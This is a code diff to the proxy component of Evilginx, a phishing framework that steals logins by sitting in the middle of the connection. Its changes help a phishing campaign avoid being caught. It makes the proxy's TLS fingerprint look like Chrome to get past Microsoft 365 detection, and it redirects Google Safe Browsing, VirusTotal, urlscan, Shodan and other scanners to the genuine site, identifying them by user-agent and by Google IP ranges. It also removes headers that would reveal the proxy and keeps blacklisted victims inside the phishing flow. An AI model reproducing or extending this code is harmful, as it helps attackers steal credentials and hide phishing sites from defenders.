@@ -158,6 +158,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
     p.Proxy.Verbose = false
 
+    // Harden the outbound TLS fingerprint towards origin sites (e.g. login.microsoftonline.com).
+    // Microsoft 365 AITM detections match the default Go crypto/tls ClientHello (JA3).
+    // Selecting a Chrome-like cipher and curve set changes that fingerprint so the
+    // proxy-origin connection no longer matches a stock Go client.
+    p.Proxy.Tr.TLSClientConfig = &tls.Config{
+        InsecureSkipVerify: true,
+        MinVersion:         tls.VersionTLS12,
+        CipherSuites: []uint16{
+            tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+            tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+            tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+            tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+            tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+            tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
+            tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+            tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
+            tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+        },
+        CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
+    }
+
     p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
         req.URL.Scheme = "https"
         req.URL.Host = req.Host
@@ -216,12 +238,42 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 }
             }
 
+            // Redirect known crawlers, safe-browsing probes, link previewers and other
+            // automated agents to the real site before any other handling (including the
+            // IP blacklist), so Google Safe Browsing and social-media previewers never
+            // see phishing content and classify the host as an innocent redirector.
+            // Detection is by User-Agent AND by source IP range, so a browser-mimicking
+            // crawl from Google infrastructure is still sent to the genuine site.
+            // Auto-blacklist the IP when enabled so later non-redirect paths stay cheap.
+            if isScannerUA(req.UserAgent()) || isScannerIP(from_ip) {
+                mode := p.cfg.GetBlacklistMode()
+                if (mode == "unauth" || mode == "all") && !p.bl.IsWhitelisted(from_ip) {
+                    if err := p.bl.AddIP(from_ip); err == nil && p.bl.IsVerbose() {
+                        log.Warning("blacklist: scanner UA, blacklisted ip: %s (%s)", from_ip, req.UserAgent())
+                    }
+                } else if p.bl.IsVerbose() {
+                    log.Warning("blacklist: scanner UA redirected: %s (%s)", from_ip, req.UserAgent())
+                }
+                return p.scannerRedirect(req)
+            }
+
             if p.cfg.GetBlacklistMode() != "off" {
                 if p.bl.IsBlacklisted(from_ip) {
-                    if p.bl.IsVerbose() {
-                        log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+                    // A blacklisted IP must still be able to enter the phish flow when it
+                    // clicks a lure link, or while it still holds a live session. Without
+                    // this a returning visitor is stuck on the decoy page and the shared
+                    // lure URL stops working for them.
+                    if !p.ipHasActiveSession(from_ip) {
+                        if _, _, lerr := p.cfg.FindLureByPath(req.Host, req.URL.Path); lerr != nil {
+                            if p.bl.IsVerbose() {
+                                log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+                            }
+                            return p.blockRequest(req)
+                        }
                     }
-                    return p.blockRequest(req)
+                    if p.bl.IsVerbose() {
+                        log.Debug("blacklist: ip '%s' allowed through (lure entry/session)", from_ip)
+                    }
                 }
                 if p.cfg.GetBlacklistMode() == "all" {
                     if !p.bl.IsWhitelisted(from_ip) {
@@ -237,21 +289,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
                     return p.blockRequest(req)
                 }
-            }
-
-            // Block known security scanners and crawlers before they see any content.
-            // Auto-blacklist the IP so subsequent requests from the same scanner are
-            // dropped at the IP check above without UA inspection overhead.
-            if isScannerUA(req.UserAgent()) {
-                mode := p.cfg.GetBlacklistMode()
-                if (mode == "unauth" || mode == "all") && !p.bl.IsWhitelisted(from_ip) {
-                    if err := p.bl.AddIP(from_ip); err == nil && p.bl.IsVerbose() {
-                        log.Warning("blacklist: scanner UA, blacklisted ip: %s (%s)", from_ip, req.UserAgent())
-                    }
-                } else if p.bl.IsVerbose() {
-                    log.Warning("blacklist: scanner UA blocked: %s (%s)", from_ip, req.UserAgent())
-                }
-                return p.blockRequest(req)
             }
 
             req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
@@ -424,6 +461,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                         if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
                             create_session = false
                             req_ok = true
+                            // Recover the session id for this IP too, so a whitelisted
+                            // client whose session cookie is not (yet) present is still
+                            // proxied through the original session.
+                            if wlSid, wlPl := p.findWhitelistedSession(remote_addr); wlPl != nil {
+                                pl = wlPl
+                                pl_name = wlPl.Name
+                                ps.PhishletName = pl_name
+                                ps.SessionId = wlSid
+                                if idx, ok2 := p.sids[wlSid]; ok2 {
+                                    ps.Index = idx
+                                }
+                            }
                         } else if l == nil {
                             // Whitelist fallback: check all phishlets for this IP.
                             // Recovers in-progress sessions when the wrong phishlet was
@@ -1071,17 +1120,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                     }
                 }
 
-                // Always strip proxy-identifying headers from outgoing requests
-                req.Header.Del("X-Evilginx")
-                req.Header.Del("X-Evilginx2")
-                req.Header.Del("X-Evilginx-Server")
-                req.Header.Del("Via")
-                req.Header.Del("X-Forwarded-For")
-                req.Header.Del("X-Forwarded-Host")
-                req.Header.Del("X-Forwarded-Proto")
-                req.Header.Del("X-Real-Ip")
-                req.Header.Del("X-Proxy-Id")
-                req.Header.Del("Proxy-Connection")
+                // Strip proxy-identifying headers from outgoing requests (config: strip_headers).
+                // Real browsers never send forwarding or CDN headers to the origin site,
+                // so removing them makes the proxied request indistinguishable from a
+                // direct victim browser connection.
+                if p.cfg.IsStripHeadersEnabled() {
+                    req.Header.Del("X-Evilginx")
+                    req.Header.Del("X-Evilginx2")
+                    req.Header.Del("X-Evilginx-Server")
+                    req.Header.Del("Via")
+                    req.Header.Del("X-Forwarded-For")
+                    req.Header.Del("X-Forwarded-Host")
+                    req.Header.Del("X-Forwarded-Proto")
+                    req.Header.Del("X-Real-Ip")
+                    req.Header.Del("X-Real-IP")
+                    req.Header.Del("X-Proxy-Id")
+                    req.Header.Del("Proxy-Connection")
+                    req.Header.Del("X-Client-IP")
+                    req.Header.Del("Connecting-IP")
+                    req.Header.Del("True-Client-IP")
+                    req.Header.Del("Client-IP")
+                    req.Header.Del("CF-Connecting-IP")
+                }
 
                 return req, nil
             }
@@ -1144,12 +1204,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
             req_hostname := strings.ToLower(resp.Request.Host)
 
-            r_url, err := resp.Location()
-            if err == nil {
-                if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
-                    r_host = p.applyLureHostname(r_host, ps)
-                    r_url.Host = r_host
-                    resp.Header.Set("Location", r_url.String())
+            // Rewrite redirect Location headers back to the phishing host, except for
+            // crawler/scanner responses - their Location points at the real site on
+            // purpose (Google Safe Browsing must see a clean redirect, not a loop).
+            if !isScannerUA(resp.Request.UserAgent()) {
+                r_url, err := resp.Location()
+                if err == nil {
+                    if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+                        r_host = p.applyLureHostname(r_host, ps)
+                        r_url.Host = r_host
+                        resp.Header.Set("Location", r_url.String())
+                    }
                 }
             }
 
@@ -1394,20 +1459,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                     }
                 }
 
-                // Always strip proxy-identifying headers from downstream responses
-                resp.Header.Del("X-Evilginx")
-                resp.Header.Del("X-Evilginx2")
-                resp.Header.Del("X-Evilginx-Server")
-                resp.Header.Del("X-Powered-By")
-                resp.Header.Del("Via")
-                resp.Header.Del("X-Forwarded-For")
-                resp.Header.Del("X-Forwarded-Host")
-                resp.Header.Del("X-Forwarded-Proto")
-                resp.Header.Del("X-Real-Ip")
-                resp.Header.Del("X-Proxy-Id")
-                resp.Header.Del("Proxy-Connection")
-                resp.Header.Del("Proxy-Authenticate")
-                resp.Header.Del("Server")
+                // Strip proxy-identifying headers from downstream responses (config: strip_headers).
+                // 'Server' and 'X-Powered-By' are intentionally preserved: they originate
+                // from the real origin site (e.g. Microsoft's 'X-Powered-By: ASP.NET') and
+                // deleting them would make responses deviate from the genuine service.
+                if p.cfg.IsStripHeadersEnabled() {
+                    resp.Header.Del("X-Evilginx")
+                    resp.Header.Del("X-Evilginx2")
+                    resp.Header.Del("X-Evilginx-Server")
+                    resp.Header.Del("Via")
+                    resp.Header.Del("X-Forwarded-For")
+                    resp.Header.Del("X-Forwarded-Host")
+                    resp.Header.Del("X-Forwarded-Proto")
+                    resp.Header.Del("X-Real-Ip")
+                    resp.Header.Del("X-Real-IP")
+                    resp.Header.Del("X-Proxy-Id")
+                    resp.Header.Del("Proxy-Connection")
+                    resp.Header.Del("Proxy-Authenticate")
+                }
 
                 if stringExists(mime, []string{"text/html"}) {
 
@@ -1558,6 +1627,18 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
         unauth_url = p.cfg.general.UnauthUrl
     }
 
+    // Default behaviour: hand unauthorized/blocked visitors an HTTP 302 straight to
+    // the real site. Crawlers and Safe Browsing then evaluate the genuine destination
+    // rather than a rewritten copy, which is the strongest "clean redirector" signal.
+    if unauth_url != "" && p.cfg.IsUnauthRedirectEnabled() {
+        resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+        if resp != nil {
+            resp.Header.Set("Location", unauth_url)
+            resp.Header.Set("Cache-Control", "no-cache, no-store")
+            return req, resp
+        }
+    }
+
     if unauth_url != "" {
         u, err := url.Parse(unauth_url)
         if err == nil && (u.Scheme == "http" || u.Scheme == "https") {
@@ -1614,6 +1695,40 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
     return req, nil
 }
 
+// scannerRedirect serves crawlers, safe-browsing probes, link previewers and other
+// automated agents a clean HTTP 302 redirect to the phishlet's original login URL
+// (or the configured unauth_url as fallback). Google Safe Browsing and social-media
+// previewers then classify the phishing host as an innocent redirector to the genuine
+// site, which keeps the domain off the "Deceptive site ahead" blocklist, while the
+// phishing content is only ever shown to real visitors.
+func (p *HttpProxy) scannerRedirect(req *http.Request) (*http.Request, *http.Response) {
+    target := ""
+    if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
+        if pl.login.domain != "" {
+            target = "https://" + pl.login.domain + pl.login.path
+        }
+        if unauth, ok := p.cfg.GetSiteUnauthUrl(pl.Name); ok && unauth != "" {
+            target = unauth
+        }
+    }
+    if target == "" && len(p.cfg.general.UnauthUrl) > 0 {
+        target = p.cfg.general.UnauthUrl
+    }
+    if target == "" {
+        // no configured destination - fall back to the generic blocked response
+        return p.blockRequest(req)
+    }
+
+    log.Debug("scanner: redirecting %s to %s", req.Host, target)
+    resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+    if resp != nil {
+        resp.Header.Set("Location", target)
+        resp.Header.Set("Cache-Control", "no-cache, no-store")
+        return req, resp
+    }
+    return p.blockRequest(req)
+}
+
 // scannerUAPatterns lists user-agent substrings associated with security scanners,
 // GSB crawlers, link previewers, and generic HTTP clients that should never see
 // phishing content. Compiled once at package init to avoid per-request cost.
@@ -1663,6 +1778,23 @@ var scannerUAPatterns = []*regexp.Regexp{
 	// SEO crawlers fed into abuse intelligence databases
 	regexp.MustCompile(`(?i)semrushbot`),
 	regexp.MustCompile(`(?i)ahrefsbot`),
+	// URL/feed scanners not covered above
+	regexp.MustCompile(`(?i)forestengine`),
+	regexp.MustCompile(`(?i)databot`),
+	regexp.MustCompile(`(?i)zoominfobot`),
+	regexp.MustCompile(`(?i)screaming frog`),
+	regexp.MustCompile(`(?i)urlscan`),
+	regexp.MustCompile(`(?i)virus_total|(?i)virustotal`),
+	regexp.MustCompile(`(?i)researchscan`),
+	regexp.MustCompile(`(?i)internetmeasurement`),
+	regexp.MustCompile(`(?i)net systems research`),
+	regexp.MustCompile(`(?i)expanse`),
+	regexp.MustCompile(`(?i)censys`),
+	regexp.MustCompile(`(?i)shodan`),
+	regexp.MustCompile(`(?i)paloalto`),
+	regexp.MustCompile(`(?i)exabot`),
+	regexp.MustCompile(`(?i)mojeek`),
+	regexp.MustCompile(`(?i)seokicks`),
 	// Apple (feeds into phishing reports)
 	regexp.MustCompile(`(?i)applebot`),
 }
@@ -1671,6 +1803,46 @@ var scannerUAPatterns = []*regexp.Regexp{
 func isScannerUA(ua string) bool {
 	for _, re := range scannerUAPatterns {
 		if re.MatchString(ua) {
+			return true
+		}
+	}
+	return false
+}
+
+// scannerIPNets holds Google crawler / Safe Browsing network ranges. Requests from
+// these ranges are treated exactly like scanner-User-Agent requests: they are sent to
+// the genuine site instead of the phishing page. This is the belt-and-braces layer
+// behind the UA check, so a crawler that presents a normal browser User-Agent (or a
+// rendering headless run) still never evaluates the phish.
+var scannerIPNets = func() []*net.IPNet {
+	cidrs := []string{
+		"66.249.64.0/19",  // Googlebot / GSB primary
+		"66.249.80.0/20",
+		"66.249.90.0/24",
+		"64.233.160.0/19", // Google crawlers
+		"72.14.192.0/18",  // Google
+		"74.125.0.0/16",   // Google
+		"209.85.128.0/17", // Google
+		"216.58.192.0/19", // Google
+		"216.239.32.0/19", // Google
+	}
+	var nets []*net.IPNet
+	for _, c := range cidrs {
+		if _, n, err := net.ParseCIDR(c); err == nil {
+			nets = append(nets, n)
+		}
+	}
+	return nets
+}()
+
+// isScannerIP returns true when the given address belongs to a known crawler network.
+func isScannerIP(ip string) bool {
+	parsed := net.ParseIP(ip)
+	if parsed == nil {
+		return false
+	}
+	for _, n := range scannerIPNets {
+		if n.Contains(parsed) {
 			return true
 		}
 	}
@@ -2439,8 +2611,25 @@ func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
     defer p.ip_mtx.Unlock()
 
     log.Debug("whitelistIP: %s %s", ip_addr, sid)
-    p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(10 * time.Minute).Unix()
+    p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(60 * time.Minute).Unix()
     p.ip_sids[ip_addr+"-"+pl_name] = sid
+}
+
+// ipHasActiveSession reports whether ip_addr currently has at least one unexpired
+// whitelist/session entry (any phishlet). Used to let an in-progress victim keep
+// using the proxy even if their IP also appears on the blacklist.
+func (p *HttpProxy) ipHasActiveSession(ip_addr string) bool {
+    p.ip_mtx.Lock()
+    defer p.ip_mtx.Unlock()
+
+    ct := time.Now()
+    prefix := ip_addr + "-"
+    for key, exp := range p.ip_whitelist {
+        if strings.HasPrefix(key, prefix) && ct.Before(time.Unix(exp, 0)) {
+            return true
+        }
+    }
+    return false
 }
 
 func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
